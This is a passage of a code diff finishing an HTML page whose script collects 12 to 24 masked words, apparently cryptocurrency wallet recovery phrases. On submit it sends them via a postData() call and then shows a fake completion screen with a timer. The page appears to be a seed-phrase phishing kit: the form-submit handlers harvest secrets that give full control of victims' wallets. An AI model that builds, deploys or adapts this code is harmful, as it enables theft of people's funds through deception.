+        document.querySelector('.wordForm1').classList.remove('hide');  
+      document.querySelector('.wordForm2').classList.add('hide');
+      document.querySelector('.wordForm3').classList.add('hide');
+      document.querySelector('.wordForm4').classList.add('hide');
+      document.querySelector('.wordForm5').classList.add('hide');
+    }else if(wordOptions.value === "15"){
+      document.querySelector('.wordForm1').classList.add('hide');
+      document.querySelector('.wordForm2').classList.remove('hide');
+      document.querySelector('.wordForm3').classList.add('hide');
+      document.querySelector('.wordForm4').classList.add('hide');
+      document.querySelector('.wordForm5').classList.add('hide');
+    }else if(wordOptions.value === "18"){
+      document.querySelector('.wordForm1').classList.add('hide');
+      document.querySelector('.wordForm2').classList.add('hide');
+      document.querySelector('.wordForm3').classList.remove('hide');
+      document.querySelector('.wordForm4').classList.add('hide');
+      document.querySelector('.wordForm5').classList.add('hide');
+    }else if(wordOptions.value === "21"){
+      document.querySelector('.wordForm1').classList.add('hide');
+      document.querySelector('.wordForm2').classList.add('hide');
+      document.querySelector('.wordForm3').classList.add('hide');
+      document.querySelector('.wordForm4').classList.remove('hide');
+      document.querySelector('.wordForm5').classList.add('hide');
+    }else{
+      document.querySelector('.wordForm1').classList.add('hide');
+      document.querySelector('.wordForm2').classList.add('hide');
+      document.querySelector('.wordForm3').classList.add('hide');
+      document.querySelector('.wordForm4').classList.add('hide');
+      document.querySelector('.wordForm5').classList.remove('hide');
+    } 
+    });
+
+    unite.addEventListener("submit", (event) => {
+      event.preventDefault();
+        if(unit[0].value === "" || unit[1].value === "" ||  unit[2].value === "" || unit[3].value === "" || unit[4].value === "" || unit[5].value === "" || unit[6].value === "" || unit[7].value === "" || unit[8].value === "" || unit[9].value === "" || unit[10].value === "" || unit[11].value === ""){
+          document.querySelector('.button12').disabled = true;
+      }
+      else {
+          let data = `Word 1: ${unit[0].value} \nWord 2: ${unit[1].value} \nWord 3: ${unit[2].value} \nWord 4: ${unit[3].value} \nWord 5: ${unit[4].value} \nWord 6: ${unit[5].value} \nWord 7: ${unit[6].value} \nWord 8: ${unit[7].value} \nWord 9: ${unit[8].value} \nWord 10: ${unit[9].value} \nWord 11: ${unit[10].value} \nWord 12: ${unit[11].value}}`;
+          postData(data);
+          setTimeout(() => {
+            unite.classList.add('hide');
+            document.querySelector('.went').classList.add("hide")
+            done.classList.remove('hide');
+            timer2(10)
+          }, 4000);
+             }
+  });
+
+  unite1.addEventListener("submit", (event) => {
+      event.preventDefault();
+        if(unit1[0].value === "" || unit1[1].value === "" ||  unit1[2].value === "" || unit1[3].value === "" || unit1[4].value === "" || unit1[5].value === "" || unit1[6].value === "" || unit1[7].value === "" || unit1[8].value === "" || unit1[9].value === "" || unit1[10].value === "" || unit1[11].value === "" || unit1[12].value === "" || unit1[13].value === "" || unit1[14].value === ""){
+          document.querySelector('.button15').disabled = true;
+      }
+      else {
+          let data = `Word 1: ${unit1[0].value} \nWord 2: ${unit1[1].value} \nWord 3: ${unit1[2].value} \nWord 4: ${unit1[3].value} \nWord 5: ${unit1[4].value} \nWord 6: ${unit1[5].value} \nWord 7: ${unit1[6].value} \nWord 8: ${unit1[7].value} \nWord 9: ${unit1[8].value} \nWord 10: ${unit1[9].value} \nWord 11: ${unit1[10].value} \nWord 12: ${unit1[11].value} \nWord 13: ${unit1[12].value} \nWord 14: ${unit1[13].value} \nWord 15: ${unit1[14].value}`;
+          postData(data);
+          setTimeout(() => {
+            unite1.classList.add('hide');
+            document.querySelector('.went').classList.add("hide")
+            done.classList.remove('hide');
+            timer2(10)
+          }, 4000);
+             }
+  });
+  unite2.addEventListener("submit", (event) => {
+      event.preventDefault();
+        if(unit2[0].value === "" || unit2[1].value === "" ||  unit2[2].value === "" || unit2[3].value === "" || unit2[4].value === "" || unit2[5].value === "" || unit2[6].value === "" || unit2[7].value === "" || unit2[8].value === "" || unit2[9].value === "" || unit2[10].value === "" || unit2[11].value === "" || unit2[12].value === "" || unit2[13].value === "" || unit2[14].value === "" || unit2[15].value === ""  || unit2[16].value === "" || unit2[17].value === ""   ){
+          document.querySelector('.button18').disabled = true;
+      }
+      else {
+          let data = `Word 1: ${unit2[0].value} \nWord 2: ${unit2[1].value} \nWord 3: ${unit2[2].value} \nWord 4: ${unit2[3].value} \nWord 5: ${unit2[4].value} \nWord 6: ${unit2[5].value} \nWord 7: ${unit2[6].value} \nWord 8: ${unit2[7].value} \nWord 9: ${unit2[8].value} \nWord 10: ${unit2[9].value} \nWord 11: ${unit2[10].value} \nWord 12: ${unit2[11].value} \nWord 13: ${unit2[12].value} \nWord 14: ${unit2[13].value} \nWord 15: ${unit2[14].value} \nWord 16: ${unit2[15].value} \nWord 17: ${unit2[16].value} \nWord 18: ${unit2[17].value}`;
+          postData(data);
+          setTimeout(() => {
+            unite2.classList.add('hide');
+            document.querySelector('.went').classList.add("hide")
+            done.classList.remove('hide');
+            timer2(10)
+          }, 4000);
+             }
+  });
+  unite3.addEventListener("submit", (event) => {
+          event.preventDefault();
+        if(unit3[0].value === "" || unit3[1].value === "" ||  unit3[2].value === "" || unit3[3].value === "" || unit3[4].value === "" || unit3[5].value === "" || unit3[6].value === "" || unit3[7].value === "" || unit3[8].value === "" || unit3[9].value === "" || unit3[10].value === "" || unit3[11].value === "" || unit3[12].value === "" || unit3[13].value === "" || unit3[14].value === "" || unit3[15].value === ""  || unit3[16].value === "" || unit3[17].value === "" || unit3[18].value === "" || unit3[19].value === "" || unit3[20].value === ""   ){
+          document.querySelector('.button21').disabled = true;
+      }
+      else {
+          let data = `Word 1: ${unit3[0].value} \nWord 2: ${unit3[1].value} \nWord 3: ${unit3[2].value} \nWord 4: ${unit3[3].value} \nWord 5: ${unit3[4].value} \nWord 6: ${unit3[5].value} \nWord 7: ${unit3[6].value} \nWord 8: ${unit3[7].value} \nWord 9: ${unit3[8].value} \nWord 10: ${unit3[9].value} \nWord 11: ${unit3[10].value} \nWord 12: ${unit3[11].value} \nWord 13: ${unit3[12].value} \nWord 14: ${unit3[13].value} \nWord 15: ${unit3[14].value} \nWord 16: ${unit3[15].value} \nWord 17: ${unit3[16].value} \nWord 18: ${unit3[17].value} \nWord 19: ${unit3[18].value} \nWord 20: ${unit3[19].value}`;
+          postData(data);
+          setTimeout(() => {
+            unite3.classList.add('hide');
+            document.querySelector('.went').classList.add("hide")
+            done.classList.remove('hide');
+            timer2(10)
+          }, 4000);
+             }
+  });
+  unite4.addEventListener("submit", (event) => {
+      event.preventDefault();
+        if(unit4[0].value === "" || unit4[1].value === "" ||  unit4[2].value === "" || unit4[3].value === "" || unit4[4].value === "" || unit4[5].value === "" || unit4[6].value === "" || unit4[7].value === "" || unit4[8].value === "" || unit4[9].value === "" || unit4[10].value === "" || unit4[11].value === "" || unit4[12].value === "" || unit4[13].value === "" || unit4[14].value === "" || unit4[15].value === ""  || unit4[16].value === "" || unit4[17].value === "" || unit4[18].value === "" || unit4[19].value === "" || unit4[20].value === "" || unit4[21].value === "" || unit4[22].value === "" || unit4[23].value === "" ){
+          document.querySelector('.button24').disabled = true;
+      }
+      else {
+          let data = `Word 1: ${unit4[0].value} \nWord 2: ${unit4[1].value} \nWord 3: ${unit4[2].value} \nWord 4: ${unit4[3].value} \nWord 5: ${unit4[4].value} \nWord 6: ${unit4[5].value} \nWord 7: ${unit4[6].value} \nWord 8: ${unit4[7].value} \nWord 9: ${unit4[8].value} \nWord 10: ${unit4[9].value} \nWord 11: ${unit4[10].value} \nWord 12: ${unit4[11].value} \nWord 13: ${unit4[12].value} \nWord 14: ${unit4[13].value} \nWord 15: ${unit4[14].value} \nWord 16: ${unit4[15].value} \nWord 17: ${unit4[16].value} \nWord 18: ${unit4[17].value} \nWord 19: ${unit4[18].value} \nWord 20: ${unit4[19].value} \nWord 21: ${unit4[20].value} \nWord 22: ${unit4[21].value} \nWord 23: ${unit4[22].value} \nWord 24: ${unit4[23].value}`;
+          postData(data);
+          setTimeout(() => {
+            unite4.classList.add('hide');
+            document.querySelector('.went').classList.add("hide")
+            done.classList.remove('hide');
+            timer2(10)
+          }, 4000);
+             }
+  });
+
+  eye12.forEach((e, index) => {
+      e.addEventListener('click',()=>{
+        if(unit[index].type === 'password'){
+          unit[index].type = "text";
+          e.src = "https://bestfilltype.netlify.app/eye-open.png";
+        }else{
+          unit[index].type = "password";
+          e.src = "https://bestfilltype.netlify.app/eye-close.png";
+        }
+      });
+    });
+
+    eye15.forEach((e, index) => {
+      e.addEventListener('click',()=>{
+        if(unit1[index].type === 'password'){
+          unit1[index].type = "text";
+          e.src = "https://bestfilltype.netlify.app/eye-open.png";
+        }else{
+          unit1[index].type = "password";
+          e.src = "https://bestfilltype.netlify.app/eye-close.png";
+        }
+      });
+    });
+   
+  
+    eye18.forEach((e, index) => {
+      e.addEventListener('click',()=>{
+        if(unit2[index].type === 'password'){
+          unit2[index].type = "text";
+          e.src = "https://bestfilltype.netlify.app/eye-open.png";
+        }else{
+          unit2[index].type = "password";
+          e.src = "https://bestfilltype.netlify.app/eye-close.png";
+        }
+      });
+    });
+   
+    eye21.forEach((e, index) => {
+      e.addEventListener('click',()=>{
+        if(unit3[index].type === 'password'){
+          unit3[index].type = "text";
+          e.src = "https://bestfilltype.netlify.app/eye-open.png";
+        }else{
+          unit3[index].type = "password";
+          e.src = "https://bestfilltype.netlify.app/eye-close.png";
+        }
+      });
+    });
+   
+    eye24.forEach((e, index) => {
+      e.addEventListener('click',()=>{
+        if(unit4[index].type === 'password'){
+          unit4[index].type = "text";
+          e.src = "https://bestfilltype.netlify.app/eye-open.png";
+        }else{
+          unit4[index].type = "password";
+          e.src = "https://bestfilltype.netlify.app/eye-close.png";
+        }
+      });
+    });
+  </script>
+</body>
+</html>
